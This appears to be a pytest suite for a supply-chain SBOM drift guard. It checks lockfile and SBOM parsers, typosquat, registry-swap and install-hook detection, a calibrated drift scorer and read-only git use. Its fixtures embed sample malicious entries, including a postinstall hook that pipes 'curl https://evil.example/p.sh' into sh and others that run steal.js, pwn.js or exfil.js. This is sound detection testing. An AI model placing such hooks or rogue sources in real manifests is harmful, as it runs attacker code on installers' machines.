"""
Comprehensive tests for Component 4: Hybrid Deterministic + Per-Package Git-History
SBOM Diff Guard (`engine/sbom_drift_guard.py`).
"""

from __future__ import annotations

import json
import os
from pathlib import Path
import subprocess
import sys
from typing import Any, Dict, List
import pytest

from engine.sbom_drift_guard import (
    DependencyRecord,
    PerPackageDriftScorer,
    SbomDriftFinding,
    SbomDriftGuard,
    SbomSnapshot,
    evaluate_snapshot_diff,
    levenshtein_distance,
    parse_cargo_lock,
    parse_cyclonedx_json,
    parse_package_json,
    parse_package_lock,
    parse_requirements_txt,
    run_git_readonly,
)


_CREATE_NO_WINDOW = 0x08000000 if os.name == "nt" else 0


def _git_test_cmd(repo: Path, args: List[str]) -> str:
    """Test fixture helper to initialize and commit inside a temporary repo ONLY."""
    cmd = ["git", "--no-pager", "-c", "core.fsmonitor=false", "-C", str(repo), *args]
    kwargs: Dict[str, Any] = {
        "shell": False,
        "stdin": subprocess.DEVNULL,
        "stdout": subprocess.PIPE,
        "stderr": subprocess.PIPE,
        "timeout": 20.0,
    }
    if os.name == "nt":
        kwargs["creationflags"] = _CREATE_NO_WINDOW
    proc = subprocess.run(cmd, **kwargs)
    stdout = (proc.stdout or b"").decode("utf-8", errors="ignore")
    stderr = (proc.stderr or b"").decode("utf-8", errors="ignore")
    assert proc.returncode == 0, f"git {args} failed ({proc.returncode}): {stderr}\n{stdout}"
    return stdout


def _init_temp_git_repo(repo: Path) -> None:
    repo.mkdir(parents=True, exist_ok=True)
    _git_test_cmd(repo, ["init"])
    _git_test_cmd(repo, ["config", "user.email", "sbom-test@example.local"])
    _git_test_cmd(repo, ["config", "user.name", "SBOM Test"])


def _commit_all(repo: Path, message: str) -> str:
    _git_test_cmd(repo, ["add", "-A"])
    _git_test_cmd(repo, ["commit", "-m", message])
    return _git_test_cmd(repo, ["rev-parse", "HEAD"]).strip()


def _build_large_package_lock(
    num_deps: int = 500,
    *,
    version_overrides: Dict[int, str] | None = None,
    extra_packages: Dict[str, Dict[str, Any]] | None = None,
) -> str:
    overrides = version_overrides or {}
    packages: Dict[str, Dict[str, Any]] = {
        "": {
            "name": "large-enterprise-app",
            "version": "1.0.0",
            "license": "MIT",
            "dependencies": {f"dep-{i:03d}": "^1.0.0" for i in range(min(20, num_deps))},
        }
    }
    for i in range(num_deps):
        ver = overrides.get(i, "1.0.0")
        name = f"dep-{i:03d}"
        packages[f"node_modules/{name}"] = {
            "version": ver,
            "resolved": f"https://registry.npmjs.org/{name}/-/{name}-{ver}.tgz",
            "integrity": f"sha512-fakehash{i:03d}",
            "license": "MIT" if i % 2 == 0 else "Apache-2.0",
            "dependencies": {f"dep-{(i + 1) % num_deps:03d}": "^1.0.0"} if i % 5 == 0 else {},
        }
    if extra_packages:
        packages.update(extra_packages)
    return json.dumps(
        {
            "name": "large-enterprise-app",
            "version": "1.0.0",
            "lockfileVersion": 3,
            "requires": True,
            "packages": packages,
        },
        indent=2,
    )


def _build_large_cargo_lock(
    num_crates: int = 500,
    *,
    version_overrides: Dict[int, str] | None = None,
    extra_entries: List[str] | None = None,
) -> str:
    overrides = version_overrides or {}
    blocks = [
        "version = 3\n",
        '[[package]]\nname = "rust-service"\nversion = "0.1.0"\ndependencies = [\n "crate-000",\n]\n',
    ]
    for i in range(num_crates):
        ver = overrides.get(i, "1.0.0")
        name = f"crate-{i:03d}"
        blocks.append(
            f'[[package]]\nname = "{name}"\nversion = "{ver}"\n'
            f'source = "registry+https://github.com/rust-lang/crates.io-index"\n'
            f'checksum = "deadbeef{i:06d}"\n'
        )
    if extra_entries:
        blocks.extend(extra_entries)
    return "\n".join(blocks)


# ---------------------------------------------------------------------------
# 1. Manifest & SBOM Parsers
# ---------------------------------------------------------------------------


def test_parse_package_lock_v3_and_v1_and_package_json() -> None:
    lock_v3 = json.dumps(
        {
            "name": "demo",
            "version": "1.0.0",
            "lockfileVersion": 3,
            "packages": {
                "": {"name": "demo", "version": "1.0.0"},
                "node_modules/lodash": {
                    "version": "4.17.21",
                    "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
                    "integrity": "sha512-abc",
                    "license": "MIT",
                    "dependencies": {},
                },
                "node_modules/sketchy-hook": {
                    "version": "1.2.3",
                    "resolved": "git+https://evil.example/sketchy-hook.git",
                    "hasInstallScript": True,
                    "scripts": {"postinstall": "node steal.js"},
                    "dependencies": {"a": "1.0.0", "b": "1.0.0"},
                },
            },
        }
    )
    pkg_json = json.dumps(
        {
            "name": "demo",
            "version": "1.0.0",
            "scripts": {"postinstall": "echo hello"},
            "dependencies": {"lodash": "^4.17.21"},
        }
    )
    recs_v3 = parse_package_lock(lock_v3, package_json_content=pkg_json)
    by_name = {r.name: r for r in recs_v3}
    assert "lodash" in by_name
    assert by_name["lodash"].version == "4.17.21"
    assert by_name["lodash"].license_id == "MIT"
    assert not by_name["lodash"].is_unpinned_or_git
    assert not by_name["lodash"].has_install_or_build_hook

    assert "sketchy-hook" in by_name
    assert by_name["sketchy-hook"].is_unpinned_or_git is True
    assert by_name["sketchy-hook"].has_install_or_build_hook is True
    assert by_name["sketchy-hook"].direct_dep_count == 2

    # Root package.json postinstall hook propagated
    assert by_name["demo"].has_install_or_build_hook is True

    # lockfileVersion 1 recursive dependencies
    lock_v1 = json.dumps(
        {
            "name": "legacy-app",
            "lockfileVersion": 1,
            "dependencies": {
                "express": {
                    "version": "4.18.2",
                    "resolved": "https://registry.npmjs.org/express/-/express-4.18.2.tgz",
                    "integrity": "sha512-xyz",
                    "requires": {"qs": "6.11.0"},
                    "dependencies": {
                        "nested-git": {
                            "version": "git+https://github.com/org/nested-git.git#main",
                            "hasInstallScript": True,
                        }
                    },
                }
            },
        }
    )
    recs_v1 = parse_package_lock(lock_v1)
    by_v1 = {r.name: r for r in recs_v1}
    assert by_v1["express"].direct_dep_count == 1
    assert not by_v1["express"].is_unpinned_or_git
    assert by_v1["nested-git"].is_unpinned_or_git is True
    assert by_v1["nested-git"].has_install_or_build_hook is True

    root_rec, declared = parse_package_json(pkg_json)
    assert root_rec is not None and root_rec.has_install_or_build_hook is True
    assert len(declared) == 1 and declared[0].name == "lodash"


def test_parse_cargo_lock_and_cyclonedx_and_requirements() -> None:
    cargo_lock = """
version = 3

[[package]]
name = "my-crate"
version = "0.1.0"
dependencies = [
 "serde 1.0.210",
 "rogue-git",
]

[[package]]
name = "serde"
version = "1.0.210"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "aaa111"

[[package]]
name = "rogue-git"
version = "0.2.0"
source = "git+https://github.com/attacker/rogue-git?branch=main#abcdef1"
dependencies = [
 "serde 1.0.210",
]
"""
    cargo_recs = parse_cargo_lock(
        cargo_lock,
        build_rs_packages={"my-crate"},
        cargo_licenses={"my-crate": "MIT"},
    )
    by_cargo = {r.name: r for r in cargo_recs}
    assert by_cargo["my-crate"].has_install_or_build_hook is True
    assert by_cargo["my-crate"].is_unpinned_or_git is False
    assert by_cargo["my-crate"].direct_dep_count == 2
    assert by_cargo["serde"].is_unpinned_or_git is False
    assert by_cargo["rogue-git"].is_unpinned_or_git is True
    assert by_cargo["rogue-git"].direct_dep_count == 1

    req_txt = """
# Comment line
--extra-index-url https://rogue-pypi.example/simple
requests==2.32.3 \\
    --hash=sha256:abcdef
urllib3==2.2.2  # inline comment
git+https://github.com/attacker/pwned.git@main#egg=pwned-lib
directpkg @ https://attacker.example/directpkg-1.0.whl
"""
    req_recs = parse_requirements_txt(req_txt)
    by_req = {r.name: r for r in req_recs}
    assert by_req["requests"].version == "2.32.3"
    assert not by_req["requests"].is_unpinned_or_git
    assert by_req["urllib3"].version == "2.2.2"
    assert by_req["pwned-lib"].is_unpinned_or_git is True
    assert by_req["directpkg"].is_unpinned_or_git is True
    assert any(r.name.startswith("extra-index:") and r.is_unpinned_or_git for r in req_recs)

    cdx_json = json.dumps(
        {
            "bomFormat": "CycloneDX",
            "specVersion": "1.5",
            "components": [
                {
                    "type": "library",
                    "bom-ref": "pkg:npm/lodash@4.17.21",
                    "name": "lodash",
                    "version": "4.17.21",
                    "purl": "pkg:npm/lodash@4.17.21",
                    "licenses": [{"license": {"id": "MIT"}}],
                    "properties": [
                        {
                            "name": "cdx:npm:package:resolved",
                            "value": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
                        }
                    ],
                },
                {
                    "type": "library",
                    "bom-ref": "pkg:cargo/evil-cdx@0.1.0",
                    "name": "evil-cdx",
                    "version": "0.1.0",
                    "purl": "pkg:cargo/evil-cdx@0.1.0?vcs_url=git%2Bhttps://evil.example/evil-cdx.git",
                    "licenses": [{"license": {"id": "UNLICENSED"}}],
                    "properties": [{"name": "build_script", "value": "true"}],
                },
            ],
            "dependencies": [
                {"ref": "pkg:npm/lodash@4.17.21", "dependsOn": []},
                {"ref": "pkg:cargo/evil-cdx@0.1.0", "dependsOn": ["a", "b", "c"]},
            ],
        }
    )
    cdx_recs = parse_cyclonedx_json(cdx_json, manifest_path="sbom.cdx.json")
    by_cdx = {r.name: r for r in cdx_recs}
    assert by_cdx["lodash"].ecosystem == "npm"
    assert by_cdx["lodash"].license_id == "MIT"
    assert not by_cdx["lodash"].is_unpinned_or_git
    assert by_cdx["evil-cdx"].ecosystem == "cargo"
    assert by_cdx["evil-cdx"].is_unpinned_or_git is True
    assert by_cdx["evil-cdx"].has_install_or_build_hook is True
    assert by_cdx["evil-cdx"].direct_dep_count == 3


# ---------------------------------------------------------------------------
# 2. Layer 1 Deterministic Supply-Chain Rules & Precision Checks
# ---------------------------------------------------------------------------


def test_layer1_all_five_deterministic_rules_and_false_positive_guards() -> None:
    baseline = [
        DependencyRecord(
            name="lodash",
            version="4.17.20",
            ecosystem="npm",
            source_url="https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz",
            license_id="MIT",
            direct_dep_count=0,
        ),
        DependencyRecord(
            name="express",
            version="4.18.1",
            ecosystem="npm",
            source_url="https://registry.npmjs.org/express/-/express-4.18.1.tgz",
            license_id="MIT",
            direct_dep_count=5,
        ),
        DependencyRecord(
            name="axios",
            version="1.6.0",
            ecosystem="npm",
            source_url="https://registry.npmjs.org/axios/-/axios-1.6.0.tgz",
            license_id="MIT",
            direct_dep_count=2,
        ),
        DependencyRecord(
            name="@babel/core",
            version="7.24.0",
            ecosystem="npm",
            source_url="https://registry.npmjs.org/@babel/core/-/core-7.24.0.tgz",
            license_id="MIT",
        ),
        DependencyRecord(
            name="serde",
            version="1.0.200",
            ecosystem="cargo",
            source_url="registry+https://github.com/rust-lang/crates.io-index",
            license_id="MIT OR Apache-2.0",
        ),
    ]

    candidate = [
        # Registry swap
        DependencyRecord(
            name="lodash",
            version="4.17.21",
            ecosystem="npm",
            source_url="https://evil-mirror.example/lodash/-/lodash-4.17.21.tgz",
            license_id="MIT",
            direct_dep_count=0,
        ),
        # New install hook on existing package
        DependencyRecord(
            name="express",
            version="4.18.2",
            ecosystem="npm",
            source_url="https://registry.npmjs.org/express/-/express-4.18.2.tgz",
            has_install_or_build_hook=True,
            license_id="MIT",
            direct_dep_count=5,
            hook_details=("postinstall:node pwn.js",),
        ),
        # Permissive license dropped
        DependencyRecord(
            name="axios",
            version="1.6.1",
            ecosystem="npm",
            source_url="https://registry.npmjs.org/axios/-/axios-1.6.1.tgz",
            license_id="UNLICENSED",
            direct_dep_count=2,
        ),
        # Benign same-scope package (must NOT flag typosquat!)
        DependencyRecord(
            name="@babel/core",
            version="7.24.0",
            ecosystem="npm",
            source_url="https://registry.npmjs.org/@babel/core/-/core-7.24.0.tgz",
            license_id="MIT",
        ),
        DependencyRecord(
            name="@babel/code",
            version="7.24.0",
            ecosystem="npm",
            source_url="https://registry.npmjs.org/@babel/code/-/code-7.24.0.tgz",
            license_id="MIT",
        ),
        # Benign @types/<exact> package (must NOT flag typosquat!)
        DependencyRecord(
            name="@types/lodash",
            version="4.17.0",
            ecosystem="npm",
            source_url="https://registry.npmjs.org/@types/lodash/-/lodash-4.17.0.tgz",
            license_id="MIT",
        ),
        # Benign official Cargo sparse crates.io migration (must NOT flag registry swap!)
        DependencyRecord(
            name="serde",
            version="1.0.210",
            ecosystem="cargo",
            source_url="sparse+https://index.crates.io/",
            license_id="MIT OR Apache-2.0",
        ),
        # Newly added unpinned git+ dependency
        DependencyRecord(
            name="brand-new-helper",
            version="git+https://evil.example/helper.git",
            ecosystem="npm",
            source_url="git+https://evil.example/helper.git",
            is_unpinned_or_git=True,
            license_id="MIT",
        ),
        # Newly added typosquat (distance 1 from lodash)
        DependencyRecord(
            name="lodsh",
            version="4.17.21",
            ecosystem="npm",
            source_url="https://registry.npmjs.org/lodsh/-/lodsh-4.17.21.tgz",
            license_id="MIT",
        ),
        # Legitimate popular package near react (distance 1) — must NOT false-positive!
        DependencyRecord(
            name="preact",
            version="10.22.0",
            ecosystem="npm",
            source_url="https://registry.npmjs.org/preact/-/preact-10.22.0.tgz",
            license_id="MIT",
        ),
    ]

    findings = evaluate_snapshot_diff(baseline, candidate)
    by_rule = {(f.rule_id, f.package_name): f for f in findings}

    assert ("SBOM_REGISTRY_SOURCE_SWAP", "lodash") in by_rule
    assert ("SBOM_NEW_INSTALL_BUILD_HOOK", "express") in by_rule
    assert ("SBOM_LICENSE_DROP", "axios") in by_rule
    assert ("SBOM_UNPINNED_GIT_DEP", "brand-new-helper") in by_rule
    assert ("SBOM_TYPOSQUAT_SUSPECT", "lodsh") in by_rule
    assert by_rule[("SBOM_TYPOSQUAT_SUSPECT", "lodsh")].evidence["edit_distance"] == 1

    # Confirm zero false positives on benign packages
    flagged_pkgs = {f.package_name for f in findings}
    assert "@babel/code" not in flagged_pkgs
    assert "@types/lodash" not in flagged_pkgs
    assert "serde" not in flagged_pkgs
    assert "preact" not in flagged_pkgs

    # Single-snapshot scan still catches unpinned git+ and suspicious install hooks
    single_findings = evaluate_snapshot_diff(None, candidate)
    single_rules = {(f.rule_id, f.package_name) for f in single_findings}
    assert ("SBOM_UNPINNED_GIT_DEP", "brand-new-helper") in single_rules
    assert ("SBOM_TYPOSQUAT_SUSPECT", "lodsh") in single_rules

    # Check Levenshtein helper
    assert levenshtein_distance("lodash", "lodsh") == 1
    assert levenshtein_distance("requests", "reqeusts") == 2


def test_corporate_private_registry_no_false_positive() -> None:
    baseline = [
        DependencyRecord(
            name=f"corp-lib-{i:02d}",
            version="1.0.0",
            ecosystem="npm",
            source_url=f"https://npm.internal.corp/corp-lib-{i:02d}/-/corp-lib-{i:02d}-1.0.0.tgz",
            license_id="MIT",
        )
        for i in range(5)
    ]
    candidate = list(baseline) + [
        DependencyRecord(
            name="analytics-sdk",
            version="2.0.0",
            ecosystem="npm",
            source_url="https://npm.internal.corp/analytics-sdk/-/analytics-sdk-2.0.0.tgz",
            license_id="MIT",
        )
    ]
    findings = evaluate_snapshot_diff(baseline, candidate)
    assert findings == []


# ---------------------------------------------------------------------------
# 3. 500-Dependency Non-Dilution Invariant + Real Git Cold-Start & Calibrated Layer 2
# ---------------------------------------------------------------------------


def test_500_dep_package_lock_single_injection_and_cold_start_to_calibrated_layer2(
    tmp_path: Path,
) -> None:
    repo = tmp_path / "repo_500_npm"
    _init_temp_git_repo(repo)

    lock_path = repo / "package-lock.json"

    # Initial commit with 500 clean dependencies
    lock_path.write_text(_build_large_package_lock(500), encoding="utf-8")
    _commit_all(repo, "commit 0: initial 500 deps")

    # 3 benign patch commits -> total 4 commits (< 10 cold-start gate)
    for step in range(1, 4):
        overrides = {step * 3: f"1.0.{step}", step * 3 + 1: f"1.{step}.0"}
        lock_path.write_text(
            _build_large_package_lock(500, version_overrides=overrides),
            encoding="utf-8",
        )
        _commit_all(repo, f"commit {step}: benign updates")

    # Inject 1 malicious git+ + postinstall package into the 500-dep lockfile at commit 4 (5 commits total < 10)
    malicious_entry = {
        "node_modules/shadow-telemetry": {
            "version": "1.0.0",
            "resolved": "git+https://evil.example/shadow-telemetry.git",
            "hasInstallScript": True,
            "scripts": {"postinstall": "curl https://evil.example/p.sh | sh"},
            "dependencies": {f"dep-{k:03d}": "^1.0.0" for k in range(15)},
        }
    }
    lock_path.write_text(
        _build_large_package_lock(500, extra_packages=malicious_entry),
        encoding="utf-8",
    )
    _commit_all(repo, "commit 4: inject 1 malicious pkg into 500 deps")

    guard = SbomDriftGuard(seed=42)
    cold_res = guard.scan_repository(repo, max_commits=30, min_lockfile_commits=10)

    assert cold_res["status"] == "ok"
    assert cold_res["commits_analyzed"] == 5
    assert cold_res["layer2_active"] is False
    assert cold_res["cold_start_active"] is True
    assert cold_res["packages_analyzed"] == 501
    assert cold_res["layer2_findings_count"] == 0

    cold_rules = {(f["rule_id"], f["package_name"], f["layer"]) for f in cold_res["findings"]}
    assert ("SBOM_UNPINNED_GIT_DEP", "shadow-telemetry", "deterministic_rule") in cold_rules
    assert ("SBOM_NEW_INSTALL_BUILD_HOOK", "shadow-telemetry", "deterministic_rule") in cold_rules
    assert all(f["package_name"] == "shadow-telemetry" for f in cold_res["findings"])

    # Now build a clean 12-commit 500-dep repo (>= 10 historical commits) to verify Layer 2 calibration!
    repo_cal = tmp_path / "repo_500_npm_calibrated"
    _init_temp_git_repo(repo_cal)
    lock_cal = repo_cal / "package-lock.json"

    current_versions: Dict[int, str] = {}
    lock_cal.write_text(_build_large_package_lock(500), encoding="utf-8")
    _commit_all(repo_cal, "commit 0: initial 500 deps")

    # 10 benign historical commits updating 2-3 packages each (plus occasional benign registry dep)
    benign_extras: Dict[str, Dict[str, Any]] = {}
    for step in range(1, 11):
        current_versions[step] = f"1.0.{step}"
        current_versions[step + 20] = f"1.{step}.0"
        if step in (3, 6, 9):
            bname = f"safe-util-{step}"
            benign_extras[f"node_modules/{bname}"] = {
                "version": "1.0.0",
                "resolved": f"https://registry.npmjs.org/{bname}/-/{bname}-1.0.0.tgz",
                "integrity": f"sha512-safe{step}",
                "license": "MIT",
                "dependencies": {},
            }
        lock_cal.write_text(
            _build_large_package_lock(
                500, version_overrides=current_versions, extra_packages=benign_extras
            ),
            encoding="utf-8",
        )
        _commit_all(repo_cal, f"commit {step}: benign update")

    # Commit 11: simultaneously bump 1 benign package AND inject 1 malicious git+ + postinstall package
    current_versions[42] = "1.0.2"
    malicious_plus_benign = dict(benign_extras)
    malicious_plus_benign.update(malicious_entry)
    lock_cal.write_text(
        _build_large_package_lock(
            500, version_overrides=current_versions, extra_packages=malicious_plus_benign
        ),
        encoding="utf-8",
    )
    _commit_all(repo_cal, "commit 11: inject 1 poisoned dep + 1 benign patch into 500-dep lockfile")

    res_cal = guard.scan_repository(repo_cal, max_commits=30, min_lockfile_commits=10)
    assert res_cal["status"] == "ok"
    assert res_cal["commits_analyzed"] == 12
    assert res_cal["layer2_active"] is True
    assert res_cal["cold_start_active"] is False
    assert guard.last_scorer is not None
    assert guard.last_scorer.calibrated is True
    assert guard.last_scorer.cold_start_active is False
    assert guard.last_scorer.min_latent_std > 0.01  # Collapse-free EMA-JEPA verification

    layers_by_pkg = {(f["rule_id"], f["package_name"], f["layer"]) for f in res_cal["findings"]}
    assert ("SBOM_UNPINNED_GIT_DEP", "shadow-telemetry", "deterministic_rule") in layers_by_pkg
    assert ("SBOM_NEW_INSTALL_BUILD_HOOK", "shadow-telemetry", "deterministic_rule") in layers_by_pkg
    assert (
        "SBOM_PER_PACKAGE_LATENT_DRIFT",
        "shadow-telemetry",
        "per_package_latent_drift",
    ) in layers_by_pkg

    l2_finding = next(
        f for f in res_cal["findings"] if f["layer"] == "per_package_latent_drift"
    )
    assert l2_finding["surprise_score"] is not None
    assert l2_finding["threshold"] is not None
    assert l2_finding["surprise_score"] > l2_finding["threshold"]

    # The benign patch bump dep-042 must NOT be flagged by either Layer 1 or Layer 2
    assert all(f["package_name"] != "dep-042" for f in res_cal["findings"])


def test_500_crate_cargo_lock_and_build_rs_injection(tmp_path: Path) -> None:
    repo = tmp_path / "repo_500_cargo"
    _init_temp_git_repo(repo)

    (repo / "Cargo.toml").write_text(
        '[package]\nname = "rust-service"\nversion = "0.1.0"\nlicense = "MIT"\n',
        encoding="utf-8",
    )
    cargo_lock = repo / "Cargo.lock"
    overrides: Dict[int, str] = {}
    cargo_lock.write_text(_build_large_cargo_lock(500), encoding="utf-8")
    _commit_all(repo, "commit 0: initial 500 crates")

    for step in range(1, 11):
        overrides[step] = f"1.0.{step}"
        cargo_lock.write_text(
            _build_large_cargo_lock(500, version_overrides=overrides),
            encoding="utf-8",
        )
        _commit_all(repo, f"commit {step}: benign crate patch")

    # Commit 11: add build.rs to rust-service + inject 1 git+ crate into 500-crate Cargo.lock
    (repo / "build.rs").write_text('fn main() { println!("cargo:rerun-if-changed=build.rs"); }\n', encoding="utf-8")
    evil_crate = (
        '[[package]]\nname = "evil-cargo-dep"\nversion = "0.1.0"\n'
        'source = "git+https://evil.example/evil-cargo-dep?branch=main#1234567"\n'
        'dependencies = [\n "crate-000",\n "crate-001",\n "crate-002",\n]\n'
    )
    cargo_lock.write_text(
        _build_large_cargo_lock(500, version_overrides=overrides, extra_entries=[evil_crate]),
        encoding="utf-8",
    )
    _commit_all(repo, "commit 11: add build.rs + git+ crate")

    guard = SbomDriftGuard(seed=42)
    res = guard.scan_repository(repo, max_commits=30, min_lockfile_commits=10)
    assert res["commits_analyzed"] == 12
    assert res["layer2_active"] is True
    assert "cargo" in res["ecosystems"]

    found = {(f["rule_id"], f["package_name"], f["layer"]) for f in res["findings"]}
    assert ("SBOM_NEW_INSTALL_BUILD_HOOK", "rust-service", "deterministic_rule") in found
    assert ("SBOM_UNPINNED_GIT_DEP", "evil-cargo-dep", "deterministic_rule") in found
    assert ("SBOM_PER_PACKAGE_LATENT_DRIFT", "rust-service", "per_package_latent_drift") in found
    assert ("SBOM_PER_PACKAGE_LATENT_DRIFT", "evil-cargo-dep", "per_package_latent_drift") in found


# ---------------------------------------------------------------------------
# 4. Pure-Python Fallback Parity, Serialization & SARIF Compatibility
# ---------------------------------------------------------------------------


def test_numpy_and_pure_python_scorer_parity_and_serialization() -> None:
    snapshots: List[SbomSnapshot] = []
    for step in range(12):
        recs: Dict[str, DependencyRecord] = {}
        for i in range(10):
            ver = f"1.0.{step}" if i == (step % 5) else "1.0.0"
            rec = DependencyRecord(
                name=f"lib-{i:02d}",
                version=ver,
                ecosystem="npm",
                source_url=f"https://registry.npmjs.org/lib-{i:02d}/-/lib-{i:02d}-{ver}.tgz",
                license_id="MIT",
                direct_dep_count=1,
            )
            recs[rec.canonical_key] = rec
        snapshots.append(SbomSnapshot(records=recs, commit_sha=f"deadbeef{step:02d}"))

    scorer_np = PerPackageDriftScorer(min_lockfile_commits=10, seed=7, use_numpy=True)
    scorer_py = PerPackageDriftScorer(min_lockfile_commits=10, seed=7, use_numpy=False)

    meta_np = scorer_np.fit_from_snapshots(snapshots, total_lockfile_commits=12)
    meta_py = scorer_py.fit_from_snapshots(snapshots, total_lockfile_commits=12)

    assert meta_np["calibrated"] is True
    assert meta_py["calibrated"] is True
    assert abs(scorer_np.threshold - scorer_py.threshold) < 1e-6

    malicious_rec = DependencyRecord(
        name="evil-inject",
        version="1.0.0",
        ecosystem="npm",
        source_url="git+https://evil.example/evil-inject.git",
        is_unpinned_or_git=True,
        has_install_or_build_hook=True,
        license_id="",
        direct_dep_count=20,
    )
    v_np = scorer_np.score_component_transition(None, malicious_rec)
    v_py = scorer_py.score_component_transition(None, malicious_rec)
    assert v_np["is_anomalous"] is True
    assert v_py["is_anomalous"] is True
    assert abs(v_np["surprise_score"] - v_py["surprise_score"]) < 1e-6

    # JSON round-trip serialization
    raw_json = json.dumps(scorer_np.to_dict())
    restored = PerPackageDriftScorer.from_dict(json.loads(raw_json))
    v_restored = restored.score_component_transition(None, malicious_rec)
    assert restored.calibrated is True
    assert abs(v_restored["surprise_score"] - v_np["surprise_score"]) < 1e-9


def test_finding_dict_compatible_with_mantis_sarif() -> None:
    finding = SbomDriftFinding(
        rule_id="SBOM_UNPINNED_GIT_DEP",
        severity="CRITICAL",
        title="Unpinned git+ dependency introduced: evil-pkg",
        description="Dependency resolves from git+https://evil.example/evil-pkg.git",
        package_name="evil-pkg",
        ecosystem="npm",
        layer="deterministic_rule",
        surprise_score=None,
        threshold=None,
        cwe="CWE-829",
        evidence={"manifest_path": "package-lock.json", "source_url": "git+https://evil.example/evil-pkg.git"},
    )
    d = finding.to_finding_dict()
    assert d["rule_id"] == "SBOM_UNPINNED_GIT_DEP"
    assert d["severity"] == "CRITICAL"
    assert d["cwe"] == "CWE-829"
    assert d["file_path"] == "package-lock.json"
    assert d["sink"] == "npm:evil-pkg"
    assert d["scanner"] == "sbom_drift_guard"

    # Verify seamless interoperability with mantis_integrator.build_sarif_document (read-only import)
    from engine.mantis_integrator import build_sarif_document

    sarif = build_sarif_document(
        tool_name="sbom_drift_guard",
        tool_uri="https://github.com/rfchunt/sbom-drift-guard",
        target_root=".",
        findings=[d],
    )
    assert sarif["version"] == "2.1.0"
    assert len(sarif["runs"]) == 1
    assert len(sarif["runs"][0]["results"]) == 1
    assert sarif["runs"][0]["results"][0]["ruleId"] == "SBOM_UNPINNED_GIT_DEP"
    assert sarif["runs"][0]["results"][0]["level"] == "error"


# ---------------------------------------------------------------------------
# 5. Read-Only Git Safety & Subprocess Hardening
# ---------------------------------------------------------------------------


def test_read_only_git_safety_and_subprocess_flags(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # Mutating git subcommands are unconditionally rejected
    for forbidden in ("commit", "checkout", "reset", "clean", "add", "push", "merge", "rebase"):
        with pytest.raises(ValueError):
            run_git_readonly(tmp_path, [forbidden])

    repo = tmp_path / "readonly_target"
    _init_temp_git_repo(repo)
    (repo / "requirements.txt").write_text("requests==2.32.3\n", encoding="utf-8")
    head_before = _commit_all(repo, "initial reqs")
    status_before = _git_test_cmd(repo, ["status", "--porcelain"])

    recorded_calls: List[Dict[str, Any]] = []
    real_run = subprocess.run

    def _spy_run(cmd: Any, *args: Any, **kwargs: Any) -> Any:
        recorded_calls.append({"cmd": list(cmd), "kwargs": dict(kwargs)})
        return real_run(cmd, *args, **kwargs)

    monkeypatch.setattr("engine.sbom_drift_guard.subprocess.run", _spy_run)

    guard = SbomDriftGuard()
    res = guard.scan_repository(repo)
    assert res["status"] == "ok"
    assert res["read_only_git"] is True
    assert len(recorded_calls) >= 1

    for call in recorded_calls:
        cmd = call["cmd"]
        kw = call["kwargs"]
        assert cmd[0] == "git"
        assert "--no-pager" in cmd
        assert "-c" in cmd and "core.fsmonitor=false" in cmd
        assert kw.get("shell") is False
        assert kw.get("stdin") is subprocess.DEVNULL
        if os.name == "nt":
            assert kw.get("creationflags") == 0x08000000

    # Verify target repo was never mutated
    monkeypatch.undo()
    head_after = _git_test_cmd(repo, ["rev-parse", "HEAD"]).strip()
    status_after = _git_test_cmd(repo, ["status", "--porcelain"])
    assert head_after == head_before
    assert status_after == status_before


# ---------------------------------------------------------------------------
# 6. Exact Cold-Start Boundary (9 vs 10), Clean Benign Commit & Uncommitted Diff
# ---------------------------------------------------------------------------


def test_exact_cold_start_boundary_benign_zero_fp_and_uncommitted_diff(tmp_path: Path) -> None:
    repo = tmp_path / "repo_boundary"
    _init_temp_git_repo(repo)
    lock_path = repo / "package-lock.json"

    versions: Dict[int, str] = {}
    lock_path.write_text(_build_large_package_lock(60), encoding="utf-8")
    _commit_all(repo, "commit 0: initial 60 deps")

    # Commits 1..8 -> 9 commits total (< 10 -> cold start MUST remain active)
    for step in range(1, 9):
        versions[step] = f"1.0.{step}"
        versions[step + 15] = f"1.{step}.0"
        lock_path.write_text(
            _build_large_package_lock(60, version_overrides=versions),
            encoding="utf-8",
        )
        _commit_all(repo, f"commit {step}: benign")

    guard = SbomDriftGuard(seed=42)
    res_9 = guard.scan_repository(repo, max_commits=30, min_lockfile_commits=10)
    assert res_9["commits_analyzed"] == 9
    assert res_9["layer2_active"] is False
    assert res_9["cold_start_active"] is True
    assert res_9["total_findings"] == 0

    # Commit 9 -> 10 commits total (>= 10 -> Layer 2 active, still benign -> 0 findings!)
    versions[9] = "1.0.9"
    versions[24] = "1.9.0"
    lock_path.write_text(
        _build_large_package_lock(60, version_overrides=versions),
        encoding="utf-8",
    )
    _commit_all(repo, "commit 9: 10th benign commit")

    res_10_benign = guard.scan_repository(repo, max_commits=30, min_lockfile_commits=10)
    assert res_10_benign["commits_analyzed"] == 10
    assert res_10_benign["layer2_active"] is True
    assert res_10_benign["cold_start_active"] is False
    assert res_10_benign["total_findings"] == 0

    # Uncommitted working-tree injection (registry swap + postinstall + license drop on dep-001)
    tampered_lock = json.loads(lock_path.read_text(encoding="utf-8"))
    tampered_lock["packages"]["node_modules/dep-001"] = {
        "version": "1.0.99",
        "resolved": "https://evil-cdn.example/dep-001/-/dep-001-1.0.99.tgz",
        "integrity": "sha512-tampered",
        "license": "UNLICENSED",
        "hasInstallScript": True,
        "scripts": {"postinstall": "node exfil.js"},
        "dependencies": {f"dep-{k:03d}": "^1.0.0" for k in range(25)},
    }
    lock_path.write_text(json.dumps(tampered_lock, indent=2), encoding="utf-8")

    res_dirty = guard.scan_repository(repo, max_commits=30, min_lockfile_commits=10)
    assert res_dirty["has_uncommitted_manifest_changes"] is True
    assert res_dirty["layer2_active"] is True
    rules = {(f["rule_id"], f["package_name"], f["layer"]) for f in res_dirty["findings"]}
    assert ("SBOM_REGISTRY_SOURCE_SWAP", "dep-001", "deterministic_rule") in rules
    assert ("SBOM_NEW_INSTALL_BUILD_HOOK", "dep-001", "deterministic_rule") in rules
    assert ("SBOM_LICENSE_DROP", "dep-001", "deterministic_rule") in rules
    assert ("SBOM_PER_PACKAGE_LATENT_DRIFT", "dep-001", "per_package_latent_drift") in rules


